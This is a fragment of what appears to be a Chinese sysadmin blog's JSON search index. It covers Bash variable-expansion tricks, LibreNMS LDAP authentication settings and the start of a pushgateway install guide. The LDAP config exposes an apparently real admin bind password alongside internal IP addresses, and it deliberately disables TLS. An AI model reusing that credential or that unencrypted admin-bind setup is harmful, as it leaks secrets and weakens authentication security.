class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e#内容为\u0026#34;~/aaa/file.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e${var/pattern/string} 使用string代替第一个匹配的pattern\u003c/p\u003e\n\u003cp\u003e${var//pattern/string} 使用string代替所有匹配的pattern\u003c/p\u003e\n\u003cp\u003e${var,} 首字母转小写\u003c/p\u003e\n\u003cp\u003e${var,,} 全部转小写\u003c/p\u003e\n\u003cp\u003e${var^} 首字母转大写\u003c/p\u003e\n\u003cp\u003e${var^^} 全部转大写\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e特殊扩展变量\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e${var-word} 如果变量var未赋值，则返回字符串word\u003c/p\u003e\n\u003cp\u003e${var:-word} 如果变量var未赋值或者值为空，则返回字符串word\u003c/p\u003e\n\u003cp\u003e${var+word} 如果变量var有值（包括空串\u0026quot;\u0026quot;），则返回字符串word\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar1\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003efoo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evar2\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar1\u003c/span\u003e\u003cspan class=\"p\"\u003e-word\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e        \u003cspan class=\"c1\"\u003e# 内容为\u0026#34;foo\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar2\u003c/span\u003e\u003cspan class=\"p\"\u003e-word\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e   \u003cspan class=\"c1\"\u003e# 内容为\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003evar2\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"nv\"\u003eword\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# 内容为\u0026#34;word\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e${var:+word} 如果变量var有值且不为空，则返回字符串word\u003c/p\u003e\n\u003cp\u003e${var=word} 如果变量var未赋值，则返回字符串word，并为var赋值为字符串word\u003c/p\u003e\n\u003cp\u003e${var:=word} 如果变量var未赋值或者值为空串，则返回字符串word，并为var赋值为字符串word\u003c/p\u003e\n\u003cp\u003e${var?word} 如果变量var未赋值，将字符串word作为标准错误输出，否则返回变量var的值\u003c/p\u003e","title":"Shell中变量、字符串、数组、参数的技巧"},{"content":"我们openldap中用户和组的设置\n用户： ou=People,dc=ddky,dc=com #uid;#givenName;#sn;#uidNumber;#gidNumber 组： ou=group,dc=ddky,dc=com #cn;#gidNumber;#memberUID;#description 到librenms中， 172.18.31.10\ncd /opt/librenms vi config.php $config[\u0026#39;auth_mechanism\u0026#39;] = \u0026#39;ldap\u0026#39;; $config[\u0026#39;auth_ldap_server\u0026#39;] = \u0026#39;172.18.31.27\u0026#39;; $config[\u0026#39;auth_ldap_port\u0026#39;] = 389; $config[\u0026#39;auth_ldap_starttls\u0026#39;] = False; // Disable TLS on port 389 $config[\u0026#39;auth_ldap_binddn\u0026#39;] = \u0026#39;cn=admin,dc=ddky,dc=com\u0026#39;; // overrides binduser $config[\u0026#39;auth_ldap_bindpassword\u0026#39;] = \u0026#39;nishiwode\u0026#39;; $config[\u0026#39;auth_ldap_prefix\u0026#39;] = \u0026#39;cn=\u0026#39;; $config[\u0026#39;auth_ldap_suffix\u0026#39;] = \u0026#39;,ou=People,dc=ddky,dc=com\u0026#39;; // appended to usernames $config[\u0026#39;auth_ldap_groupbase\u0026#39;] = \u0026#39;ou=group,dc=ddky,dc=com\u0026#39;; // all groups must be inside this $config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;admins\u0026#39;][\u0026#39;level\u0026#39;] = 10; // set admins group to admin level $config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;pfy\u0026#39;][\u0026#39;level\u0026#39;] = 5; // set pfy group to global read only level $config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;support\u0026#39;][\u0026#39;level\u0026#39;] = 1; // set support group as a normal user $config[\u0026#39;auth_ldap_debug\u0026#39;] = false; // enable for verbose debug messages 说明： 我们的openldap因为是内部使用，所以无法设置证书，TLS是被禁止的。 openldap是禁止anonymous用户查询的，所以需要设置binddn和bindpassword 实际用户是cn=zhangranrui,ou=People,dc=ddky,dc=com，所以要设prefix librenms缺省用户有三个级别，10 5 1，对应的用户组是admins pfy support\n如果要对接其他系统，也许都需要如法炮制\n","permalink":"https://rendoumi.com/posts/20231213-librenms_ldap/","summary":"\u003cp\u003e我们openldap中用户和组的设置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003e用户\u003c/span\u003e\u003cspan class=\"err\"\u003e：\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ePeople\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003euid\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003egivenName\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003esn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003euidNumber\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003egidNumber\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e组\u003c/span\u003e\u003cspan class=\"err\"\u003e：\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003egroup\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003ecn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003egidNumber\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003ememberUID\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"n\"\u003edescription\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e到librenms中， 172.18.31.10\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecd\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eopt\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003elibrenms\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003evi\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ephp\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_mechanism\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eldap\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_server\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003e172\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003e18\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003e31\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003e27\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_port\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e389\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_starttls\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eFalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e               \u003c/span\u003e\u003cspan class=\"c1\"\u003e// Disable TLS on port 389\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_binddn\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eadmin\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// overrides binduser\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_bindpassword\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003enishiwode\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_prefix\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_suffix\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ePeople\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c1\"\u003e// appended to usernames\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groupbase\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eou\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003egroup\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eddky\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecom\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// all groups must be inside this\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groups\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eadmins\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003elevel\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e             \u003c/span\u003e\u003cspan class=\"c1\"\u003e// set admins group to admin level\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groups\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003epfy\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003elevel\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"c1\"\u003e// set pfy group to global read only level\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_groups\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003esupport\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003elevel\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"c1\"\u003e// set support group as a normal user\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"n\"\u003e$config\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"n\"\u003eauth_ldap_debug\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e                 \u003c/span\u003e\u003cspan class=\"c1\"\u003e// enable for verbose debug messages\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e说明：\n我们的openldap因为是内部使用，所以无法设置证书，TLS是被禁止的。\nopenldap是禁止anonymous用户查询的，所以需要设置binddn和bindpassword\n实际用户是cn=zhangranrui,ou=People,dc=ddky,dc=com，所以要设prefix\nlibrenms缺省用户有三个级别，10 5 1，对应的用户组是admins pfy support\u003c/p\u003e","title":"Librenms使用ldap认证用户"},{"content":"librenms是个非常强悍的工具，对网络不清楚的可以透过这个工具，对网络环境有清晰的了解。\n如何通过prometheus对librenms进行集成呢？\n一、装pushgateway\nwget https://github.com/prometheus/pushgateway/releases/download/v1.2.0/pushgateway-1.2.0.linux-amd64.tar.gz 把pushgateway放到/usr/local/bin cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt;/etc/systemd/system/pushgateway.service [Unit] Description=Codis Exporter Wants=network-online.target After=network-online.target [Service] Type=simple ExecStart=/usr/local/bin/pushgateway --web.listen-address=:50004 [Install] WantedBy=multi-user.target EOF systemctl daemon-relaod 